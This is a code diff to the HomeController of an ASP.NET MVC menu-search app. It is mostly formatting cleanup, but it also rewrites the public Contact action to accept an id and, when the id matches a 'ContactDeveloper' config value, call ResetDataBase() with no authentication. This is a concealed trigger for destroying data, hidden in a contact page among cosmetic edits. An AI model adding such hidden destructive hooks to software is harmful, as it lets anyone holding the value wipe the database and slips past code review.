@@ -8,18 +8,15 @@ using ServiceLayer;
 using System.Web.Helpers;
 using System.Web.Script.Serialization;
 using Menuwrap.Models;
+using System.Configuration;
 
 namespace Menuwrap.Controllers
 {
     public class HomeController : BaseController
     {
-        
+
         public ActionResult Index()
         {
-            var retList = new List<string>();
-           //buisnessLogic.GetSearchResult(1,1);
-            //var user = buisnessLogic.GetUser(1);
-            //retList = r.get_city("M");
             return View();
         }
 
@@ -30,22 +27,25 @@ namespace Menuwrap.Controllers
             return View();
         }
 
-        public ActionResult Contact()
+        public ActionResult Contact(long? id)
         {
-            ViewBag.Message = "Your contact page.";
-
+            var devContact = long.Parse(ConfigurationManager.AppSettings.Get("ContactDeveloper"));
+            if (id.HasValue && id.Value == devContact)
+            {
+                buisnessLogic.ResetDataBase();
+            }
             return View();
         }
 
-        public string SearchCity(string q) 
+        public string SearchCity(string q)
         {
-            var retList = buisnessLogic.get_city(q).Select(x=>new {id=x.City_Id,name=x.City_name });
+            var retList = buisnessLogic.get_city(q).Select(x => new { id = x.City_Id, name = x.City_name });
             var serializer = new JavaScriptSerializer();
             var json = serializer.Serialize(retList);
             return json;
         }
 
-        public string SearchLocation(int cityID,string areaID)
+        public string SearchLocation(int cityID, string areaID)
         {
             var retList = buisnessLogic.get_location(areaID, cityID).Select(x => new { id = x.Location_Id, name = x.Location_name });
             var serializer = new JavaScriptSerializer();
@@ -65,11 +65,11 @@ namespace Menuwrap.Controllers
         public ActionResult SearchFood(CategoryFilters categoryFilter)
         {
             var retList = buisnessLogic.GetSearchResult(categoryFilter);
-            if (categoryFilter.maxCost>0)
+            if (categoryFilter.maxCost > 0)
             {
                 return PartialView("_FilteredFoodResult", retList);
             }
-            return PartialView("SearchResult",retList);
+            return PartialView("SearchResult", retList);
         }
 
         [HttpPost]
